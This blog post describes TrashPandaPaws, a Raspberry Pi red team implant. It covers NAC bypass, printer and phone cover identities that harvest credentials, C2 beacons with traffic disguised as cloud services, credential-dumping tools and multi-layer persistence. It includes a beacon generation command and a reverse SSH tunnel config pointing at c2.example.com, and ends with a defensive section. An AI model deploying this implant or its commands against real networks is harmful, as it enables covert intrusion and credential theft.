---
layout: post
title: "TrashPandaPaws: A Raspberry Pi Red Team Network Implant"
---

<img height="200" align="left" src="/images/trashpandapaws_logo.png"> Physical implants are the quietest way into a network. Drop a small device inline between a switch port and a legitimate host, let it bridge traffic transparently, and the network barely notices a new participant. TrashPandaPaws is a Raspberry Pi 4 based inline Ethernet tap built for authorized red team engagements. It sits between a PoE switch port and the target device, extracts power from the Ethernet cable, bridges all traffic at Layer 2, and phones home through a Sliver C2 beacon while hiding behind a convincing cover identity as either a Cisco IP Phone or an HP LaserJet printer.

The project covers the full stack: custom PCB hardware with PoE extraction, 802.1X NAC bypass, dual cover identities with working protocol emulation, credential harvesting, multi layer persistence, and encrypted C2 channels. Everything runs on ParrotOS ARM64.

The source code lives at [github.com/BenjiTrapp/TrashPandaPaws](https://github.com/BenjiTrapp/TrashPandaPaws).

> TrashPandaPaws is built for authorized red team engagements only. Everything below assumes you have explicit written permission to test the network you are targeting.

- [How It Works](#how-it-works)
- [Hardware: Two Generations](#hardware-two-generations)
- [Transparent Bridge and Traffic Capture](#transparent-bridge-and-traffic-capture)
- [802.1X NAC Bypass](#8021x-nac-bypass)
- [Dual Cover Identities](#dual-cover-identities)
- [C2 Integration](#c2-integration)
- [C2 Team Server](#c2-team-server)
- [Malleable C2 Profiles](#malleable-c2-profiles)
- [Offensive Tool Integration](#offensive-tool-integration)
- [Multi Layer Persistence](#multi-layer-persistence)
- [Remote Access](#remote-access)
- [Credential Capture and Notifications](#credential-capture-and-notifications)
- [Quick Start](#quick-start)
- [Detection and Defense](#detection-and-defense)
- [Further Reading](#further-reading)

## How It Works

The implant sits inline between a switch port and a target device. The upstream port connects to the switch and extracts PoE power, while the downstream port connects to the target. A transparent Layer 2 bridge ensures all traffic flows through without interruption. Meanwhile, the implant sniffs packets, runs cover services, and maintains a C2 channel back to the operator.

<pre class="mermaid">
flowchart LR
    SW["Switch port\nPoE 802.3af"] -->|Cat6| ETH0["Pi ETH0\nupstream"]
    ETH0 --> POE["PoE extraction\nSI3402-B"]
    POE --> POWER["5V 3A\nTPS54302"]
    ETH0 --> BR["L2 Bridge\nbr0"]
    BR --> ETH1["HAT ETH1\ndownstream"]
    ETH1 -->|Cat6| TARGET["Target device"]

    BR --> SNIFF["Packet sniffer\nBPF + PCAP"]
    BR --> COVER["Cover identity\nCisco / HP"]
    BR --> C2["Sliver beacon\nmTLS / HTTPS / DNS"]
</pre>

The key design principle is transparency. The bridge forwards all frames including 802.1X authentication, so the target device stays authenticated and the network does not see a topology change. The implant's own traffic exits through the upstream port using the victim's MAC and IP credentials after NAC bypass completes.

## Hardware: Two Generations

The project ships two hardware revisions: a HAT based prototype for rapid development and an integrated carrier board for production deployments.

### V1: Raspberry Pi 4 + PoE HAT

The first version stacks two PCBs on a standard Raspberry Pi 4B. The bottom board is the Pi itself, and the top board is a custom HAT that provides PoE power extraction and a second Ethernet port via USB.

| Component | Part | Purpose |
|-----------|------|---------|
| SBC | Raspberry Pi 4B 4GB | Compute platform |
| PoE Controller | SI3402-B | IEEE 802.3af PD extraction |
| DC-DC Converter | TPS54302 | 48V to 5V at 3A regulation |
| USB to GbE | RTL8153B-VB-CG | Second Ethernet port |
| Connector | HR911105A | RJ45 downstream jack |
| Header | 2x20 2.54mm GPIO | Pi HAT interface |

Total height is about 25mm, total cost is around 75 USD. The USB adapter is the weak link: it adds latency and is visible as a USB device.

### V2: Integrated CM4 Carrier Board

The second version is a single 85x56mm four layer PCB that replaces both the Pi and the HAT. It uses a Compute Module 4 socket and integrates PoE extraction, the RTL8153B USB GbE controller, dual RJ45 connectors, and a USB-C debug port on one board.

<pre class="mermaid">
graph TB
    subgraph V2["V2 Integrated Carrier Board — 85x56mm"]
        CM4["Compute Module 4\nBCM2711 quad A72"]
        POE2["PoE extraction\nSI3402-B + TPS54302"]
        GBE2["RTL8153B\nUSB GbE on-board"]
        RJ1["RJ45 upstream"]
        RJ2["RJ45 downstream"]
        USB["USB-C debug/flash"]
        CM4 --- POE2
        CM4 --- GBE2
        GBE2 --- RJ2
        CM4 --- RJ1
        CM4 --- USB
    end
</pre>

The V2 drops the height to about 10mm and the cost to around 53 USD. A single board also simplifies assembly and makes it easier to fit inside a cover enclosure.

## Transparent Bridge and Traffic Capture

The bridge is the core of the implant. It connects `eth0` (upstream, native Ethernet) and `eth1` (downstream, USB GbE) into a single Layer 2 bridge `br0`. All frames pass through transparently, including EAPOL authentication frames that 802.1X uses.

Traffic capture uses Berkeley Packet Filter expressions to selectively sniff interesting traffic without drowning in broadcast noise. PCAP files rotate automatically for continuous logging without filling the SD card.

```yaml
bridge:
  upstream: eth0
  downstream: eth1
  capture:
    enabled: true
    bpf_filter: "tcp port 80 or tcp port 443 or tcp port 21"
    pcap_rotate_mb: 50
```

The bridge is configured by `configure_bridge.sh` and managed at runtime by `bridge_tap.py`, which handles the BPF filtering and PCAP rotation.

## 802.1X NAC Bypass

Network Access Control using 802.1X is the biggest obstacle for an inline implant. The switch port authenticates the connected device before granting access. If you unplug the legitimate device and plug in the implant, the port shuts down.

TrashPandaPaws solves this in three phases:

<pre class="mermaid">
sequenceDiagram
    participant SW as Switch
    participant IMP as Implant bridge
    participant VIC as Victim device

    Note over SW,VIC: Phase 1 — EAPOL forwarding
    VIC->>IMP: EAPOL Start
    IMP->>SW: EAPOL Start (bridged)
    SW->>IMP: EAP Request
    IMP->>VIC: EAP Request (bridged)
    VIC->>IMP: EAP Response
    IMP->>SW: EAP Response (bridged)
    SW->>IMP: EAP Success
    IMP->>VIC: EAP Success (bridged)

    Note over SW,VIC: Phase 2 — Discovery
    IMP->>IMP: Passive ARP sniffing
    IMP->>IMP: Learn victim MAC + IP
    IMP->>IMP: Learn gateway MAC + IP

    Note over SW,VIC: Phase 3 — Active bypass
    IMP->>SW: Implant traffic with victim MAC + IP
    Note over IMP: ebtables + iptables + arptables rewrite
</pre>

In phase one, the bridge simply forwards all EAPOL frames between the victim and the switch. The victim authenticates normally, and the port stays open. In phase two, the implant passively sniffs ARP traffic to learn the victim's MAC address, IP address, and the gateway's MAC and IP. In phase three, ebtables, iptables, and arptables rules rewrite the implant's outgoing traffic to use the victim's credentials. From the switch's perspective, only the authenticated device is talking.

```yaml
nac_bypass:
  enabled: true
  discovery_timeout: 120
```

## Dual Cover Identities

If someone runs a port scan or browses to the implant's IP, they should see something boring. TrashPandaPaws ships two cover identities that present realistic protocol responses and device metadata.

### Cisco IP Phone 7960

The Cisco cover emulates a VoIP phone. It runs three services:

| Port | Protocol | Behavior |
|------|----------|----------|
| 80 | HTTP | Cisco 7960 web configuration page |
| 5060 | SIP | SIP REGISTER and OPTIONS responses |
| 10000 | RTP | RTP audio stream responses |

The HTTP interface returns a realistic Cisco phone status page with device serial numbers, firmware versions, and network configuration. SIP and RTP handlers respond with protocol correct messages so that a VoIP infrastructure scanner accepts the device as legitimate.

### HP LaserJet MFP M478

The printer cover emulates a network multifunction printer with six services:

| Port | Protocol | Behavior |
|------|----------|----------|
| 80 | HTTP | HP Embedded Web Server with printer status |
| 9100 | PJL | JetDirect print job language responses |
| 515 | LPD | Line Printer Daemon |
| 631 | IPP/CUPS | Internet Printing Protocol |
| 161 | SNMP | Printer MIB with toner levels and page counts |
| 23 | Telnet | Management console with login prompt |

Both covers use real vendor OUI ranges for their MAC addresses via `macchanger`, so even a MAC vendor lookup returns the expected manufacturer. Both also include credential harvesting from login attempts and browser fingerprinting that collects Canvas, WebGL, WebRTC, timezone, and plugin data from anyone who visits the HTTP interface.

```yaml
cover:
  enabled: true
  mode: "cisco_phone"    # or "hp_printer"
```

## C2 Integration

The implant runs a Sliver beacon as its primary command and control channel. Sliver is an open source C2 framework that supports multiple transport protocols and is significantly harder to fingerprint than Cobalt Strike. A Python fallback beacon provides autonomous operation if the Sliver binary is unavailable or detected.

All beacon communication uses AES 256 GCM authenticated encryption. Keys can be auto generated, manually set as base64, or derived from the callback URL via SHA 256. The server uses Python's `cryptography` library while the beacon calls OpenSSL via `ctypes`, and both implementations interoperate seamlessly.

The Python beacon supports four transport channels with automatic fallthrough. If one channel fails, it tries the next in order:

<pre class="mermaid">
flowchart TD
    subgraph Implant
        SB["Sliver beacon\nARM64 Linux"]
        PB["Python fallback beacon"]
    end

    subgraph Transports["Transport fallthrough chain"]
        T1["HTTPS\nurllib POST + AES GCM"]
        T2["DNS\nBase32 subdomain queries"]
        T3["SMB\nAnonymous IPC$ named pipes"]
        T4["QUIC style UDP\n1200 byte datagrams"]
        T1 -->|fail| T2
        T2 -->|fail| T3
        T3 -->|fail| T4
    end

    subgraph Operator
        SS["Sliver server"]
        TS["Team server\nFlask + GUI"]
    end

    SB -->|mTLS| SS
    SB -->|HTTPS| SS
    SB -->|DNS| SS
    PB --> T1
    T1 -->|success| TS
    T2 -->|success| TS
    T3 -->|success| TS
    T4 -->|success| TS
</pre>

The Sliver beacon is generated from the operator's server as a native ARM64 Linux binary with mTLS, HTTPS, and DNS transports:

```bash
generate beacon --os linux --arch arm64 \
  --mtls c2.example.com:8888 \
  --http c2.example.com \
  --dns c2.example.com \
  --seconds 300 --jitter 20 \
  --skip-symbols --name raccoon \
  --save ./bin/implant
```

The Python fallback beacon's four channels each have distinct characteristics. HTTPS uses urllib POST requests with AES GCM encrypted bodies and supports malleable C2 profiles. DNS encodes agent IDs as Base32 subdomains. SMB uses a pure Python SMB2 stack over anonymous IPC$ named pipes. The QUIC style UDP channel fragments payloads into 1200 byte datagrams with stream reassembly.

The beacon generator supports 1 to 6 layers of nested zlib and base64 encoding with randomized variable names, making each generated payload unique in structure.

## C2 Team Server

The team server is a Flask based command and control server with an embedded single page operator GUI. It manages encrypted beacon tasking and integrates offensive tools server side rather than pushing binaries to targets.

<pre class="mermaid">
flowchart LR
    subgraph GUI["Operator GUI"]
        DASH["Dashboard"]
        TERM["Interactive terminal\nautocomplete + history"]
        FB["File browser\nupload + download"]
        LOOT["Loot viewer"]
        PROC["Process list\nAV/EDR detection"]
        NET["Network connections\nsecurity assessment"]
        PIVOT["Pivot discovery\nadjacent subnets"]
        LOG["Server logs\nfiltering"]
    end

    subgraph Server["Flask Team Server"]
        API["REST API"]
        TASK["Beacon tasking\nAES 256 GCM"]
        TOOLS["Offensive tools\nserver side"]
    end

    GUI --> API
    API --> TASK
    API --> TOOLS
</pre>

The dashboard provides real time agent management, an interactive terminal with autocomplete and command history, a remote file browser supporting navigation, download, and upload, a loot viewer for collected credentials and files, process listing with automatic AV/EDR detection covering 35 endpoint protection products, network connection parsing with security assessment, pivot discovery for adjacent subnets, and global server log filtering.

The team server can be deployed standalone or via Docker:

```bash
cd software/c2
docker compose up -d

# Custom configuration
RACCOON_PORT=443 RACCOON_SSL=1 docker compose up -d
```

Environment variables control the server: `RACCOON_PORT` (default 8443), `RACCOON_HOST`, `RACCOON_KEY` (base64 AES 256 GCM key), `RACCOON_TOKEN` (operator auth token), and `RACCOON_SSL` with certificate paths. The Docker image runs `python:3.12-slim` with `network_mode: host` and `NET_RAW`/`NET_ADMIN` capabilities for Responder integration.

## Malleable C2 Profiles

Malleable profiles control how beacon traffic looks on the wire: URIs, headers, User Agent strings, metadata encoding chains, and TLS certificate parameters. Eight built in profiles mimic legitimate cloud services:

| Profile | Mimics |
|---------|--------|
| Amazon CDN | CloudFront distribution traffic |
| Slack API | Slack workspace API calls |
| Google APIs | Google Cloud service requests |
| OneDrive Sync | Microsoft OneDrive file synchronization |
| jQuery CDN | jQuery library CDN requests |
| GitHub API | GitHub REST API interactions |
| Outlook/O365 | Microsoft 365 mail traffic |
| Cloudflare Workers | Cloudflare serverless function calls |

The profile editor in the team server GUI provides syntax highlighting, real time linting, and a seven section tutorial sidebar. Profiles can be generated from captured HTTP traffic by pasting raw Burp Suite request/response pairs and choosing an encoding. Running beacons accept live profile pushes without redeployment, and the operator can verify the result by capturing beacon HTTP requests.

## Offensive Tool Integration

The team server integrates offensive tools server side, keeping binaries off the target. Sixteen Impacket based tools run from the server through beacon sessions:

| Tool | Purpose |
|------|---------|
| PsExec | Remote command execution via SMB service |
| WMIExec | Remote execution via WMI |
| SMBExec | Remote execution via SMB shares |
| SecretsDump | Extract credentials from SAM, LSA, NTDS |
| Kerberoast | Request and crack service ticket hashes |
| AS REP Roast | Attack accounts without preauth |
| DCSync | Replicate credentials from domain controller |

Beyond Impacket, the server integrates four additional tools:

| Tool | Purpose |
|------|---------|
| NetExec (nxc) | Host enumeration, AV/EDR detection, credential spraying |
| Lsassy | Remote LSASS credential dumping |
| RelayKing | NTLM relay vulnerability auditing |
| Responder | LLMNR, NBT NS, and mDNS poisoning |

### SMBLoot

SMBLoot is a pure Python SMB2 browser built from `socket`, `struct`, `hashlib`, and `hmac` alone. It implements the complete SMB2 protocol stack (negotiate, NTLMv2 auth, tree connect, create, read, query directory) without any external dependencies. This means the operator can browse remote shares, read files, download files, and enumerate directory trees without deploying Impacket on the target.

SMBLoot supports pass the hash authentication via LM:NT format, making it useful when only NTLM hashes are available from credential dumps.

## Multi Layer Persistence

The beacon must survive reboots, service crashes, and partial remediation. TrashPandaPaws uses five independent persistence mechanisms with a PID lock to prevent duplicate execution:

| Layer | Trigger | Delay |
|-------|---------|-------|
| systemd service | `raccoon-beacon.service` | 30 seconds |
| crontab | `@reboot` | 45 seconds |
| rc.local | Boot script | 60 seconds |
| udev rule | `eth0` link up event | 30 seconds |
| systemd timer | Watchdog every 5 minutes | Continuous |

The first layer to start acquires a PID lock at `/tmp/.raccoon_beacon.pid`. All other layers check the lock and exit silently if the beacon is already running. The systemd timer acts as a watchdog: if all five instances die, the timer restarts the beacon within five minutes.

<pre class="mermaid">
flowchart TD
    BOOT["System boot"] --> SD["systemd service\n30s delay"]
    BOOT --> CRON["crontab @reboot\n45s delay"]
    BOOT --> RC["rc.local\n60s delay"]
    NET["eth0 up"] --> UDEV["udev rule\n30s delay"]

    SD --> LOCK{"/tmp/.raccoon_beacon.pid\nacquire lock?"}
    CRON --> LOCK
    RC --> LOCK
    UDEV --> LOCK

    LOCK -->|First wins| RUN["Beacon running"]
    LOCK -->|Lock held| EXIT["Exit silently"]

    TIMER["systemd timer\nevery 5 min"] --> CHECK{"Beacon alive?"}
    CHECK -->|No| RESTART["Restart beacon"]
    CHECK -->|Yes| WAIT["Sleep 5 min"]
</pre>

Staggered delays ensure the five layers do not race. The first layer to reach the lock wins, and the rest back off.

## Remote Access

Beyond C2, the implant provides two direct access methods for interactive work.

**SSH Reverse Tunnel** uses `autossh` to maintain a persistent reverse tunnel to the operator's server. The operator connects through the tunnel without needing inbound access to the target network:

```bash
# On the operator side
ssh -p 2222 root@localhost
```

**VNC Server** runs a headless `x11vnc` instance accessible only through the SSH tunnel. This provides a graphical desktop for tools that need a GUI, without exposing VNC to the network.

```yaml
remote_access:
  ssh:
    ssh_enabled: true
    ssh_remote_host: "c2.example.com"
    ssh_remote_user: "raccoon"
    ssh_tunnel_port: 2222
    ssh_key_type: "ed25519"
  vnc:
    vnc_enabled: false
    vnc_port: 5900
    vnc_password: "raccoon"
    vnc_resolution: "1024x768"
```

## Credential Capture and Notifications

Both cover identities harvest credentials from anyone who interacts with them. HTTP Basic Authentication attempts, Telnet login sequences, and browser fingerprints are all logged locally and forwarded to the operator in real time via webhooks.

```yaml
notifications:
  enabled: true
  slack:
    enabled: true
    webhook_url: "https://hooks.slack.com/services/T.../B.../xxx"
  discord:
    enabled: true
    webhook_url: "https://discord.com/api/webhooks/123/abc"
  teams:
    enabled: true
    webhook_url: "https://tenant.webhook.office.com/webhookb2/..."
```

When someone browses to the fake printer page and enters credentials, the implant captures the attempt, logs it with a Cisco IOS style timestamp, and pushes a notification to the operator's Slack, Discord, or Teams channel within seconds.

## Quick Start

### Image Builder (Recommended)

The fastest path to a deployment ready SD card is the image builder. It downloads ParrotOS ARM64, injects the Raccoon software and config, and creates a first boot provisioning service that installs dependencies, configures networking, and enables services automatically:

```bash
sudo ./software/setup/build_image.sh /dev/sdX
sudo ./software/setup/build_image.sh /dev/sdX --wifi MyNetwork:MyPassword
sudo ./software/setup/build_image.sh /dev/sdX --config /path/to/raccoon.yaml \
  --user operator:s3cret --wifi FieldOps:hunter2
```

### Manual Setup

For manual installation on an existing ParrotOS ARM64 system, four commands handle everything:

```bash
# Install dependencies and harden the OS
sudo ./software/setup/bootstrap.sh

# Configure the L2 bridge between eth0 and eth1
sudo ./software/setup/configure_bridge.sh

# Install systemd services and all persistence layers
sudo ./services/install.sh

# Activate everything
sudo reboot
```

### Sliver Deployment

The `deploy_sliver.sh` script automates generating and deploying the Sliver beacon binary:

```bash
./software/setup/deploy_sliver.sh generate           # interactive
./software/setup/deploy_sliver.sh generate-auto c2.example.com
./software/setup/deploy_sliver.sh deploy 192.168.1.100
./software/setup/deploy_sliver.sh full c2.example.com 192.168.1.100
```

### NAC Bypass Setup

The NAC bypass can be configured and monitored independently:

```bash
sudo ./software/setup/nac_bypass.sh setup
sudo ./software/setup/nac_bypass.sh status
```

After reboot, the C2 beacon starts automatically via the five persistence layers. No manual intervention required.

For development and testing without hardware, a local test server runs the cover identities on unprivileged ports:

```bash
python -m software.tests.test_server                  # Both covers
python -m software.tests.test_server --cover cisco     # Cisco only
python -m software.tests.test_server --cover printer   # HP only
```

The test server uses port 8080/8081 for HTTP and 15060 for SIP, so no root required.

## Detection and Defense

From a blue team perspective, inline implants are detectable if you know what to look for.

| Control | What It Does |
|---------|-------------|
| **802.1X with MACsec** | MACsec encrypts the link layer, so a passive bridge cannot read or inject traffic |
| **Port security** | Limit MAC addresses per port and alert on new MACs appearing downstream |
| **DHCP snooping** | Detect rogue DHCP or unexpected ARP patterns from the bridge |
| **Network device inventory** | Continuously scan for devices and flag anything not in the asset database |
| **PoE monitoring** | Watch for unexpected PoE power draw changes on switch ports |
| **Physical security** | Cable locks, locked patch panels, and regular physical audits of network closets |
| **TLS inspection** | Decrypt and inspect HTTPS C2 channels at the perimeter |
| **DNS monitoring** | Flag high entropy or high volume DNS queries that indicate DNS based C2 |

The most effective countermeasure is MACsec (IEEE 802.1AE). It provides hop by hop encryption at Layer 2, which means a transparent bridge cannot decrypt, sniff, or inject traffic even if it sits physically inline. Combined with 802.1X-2010 (which mandates MACsec key agreement), the implant is reduced to a dumb cable passthrough that cannot interact with the network at all.

## Further Reading

- [TrashPandaPaws on GitHub](https://github.com/BenjiTrapp/TrashPandaPaws)
- [Sliver C2 Framework](https://github.com/BishopFox/sliver)
- [MITRE ATT&CK T1200 — Hardware Additions](https://attack.mitre.org/techniques/T1200/)
- [MITRE ATT&CK T1557 — Adversary in the Middle](https://attack.mitre.org/techniques/T1557/)
- [IEEE 802.1AE MACsec](https://standards.ieee.org/ieee/802.1AE/7438/)
- [RaccShells: Reverse Shells Made Simple](https://benjitrapp.github.io/2026/05/01/raccshell-generator.html)
- [RaccDrop: HTML Smuggling Made Simple](https://benjitrapp.github.io/2026/04/19/raccdrop-html-smuggling.html)
